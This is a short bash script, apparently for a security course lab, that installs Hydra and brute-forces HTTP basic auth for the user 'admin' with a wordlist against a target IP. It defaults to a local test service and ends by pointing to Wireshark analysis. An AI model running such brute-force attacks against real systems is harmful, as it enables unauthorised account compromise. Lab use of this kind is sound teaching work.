#!/bin/bash
# Assignment 06: Attack Simulation via Hydra against auth_service.py
# Usage: ./attack.sh <TARGET_IP> [PORT]

TARGET_IP=${1:-"127.0.0.1"}
PORT=${2:-"8080"}

echo "=========================================================="
echo "   Assignment 06: Hydra Brute-Force against HTTP Auth"
echo "   Target : http://$TARGET_IP:$PORT/"
echo "=========================================================="

if ! command -v hydra &> /dev/null; then
    echo "[*] Installing Hydra..."
    sudo apt update && sudo apt install -y hydra
fi

echo "[*] Launching Hydra attack with wordlist.txt..."
echo "Command: hydra -l admin -P wordlist.txt -s $PORT $TARGET_IP http-get /"
echo ""
hydra -l admin -P wordlist.txt -s "$PORT" "$TARGET_IP" http-get /

echo ""
echo "=========================================================="
echo "[+] Attack completed. Now check Wireshark display filters!"
echo "=========================================================="

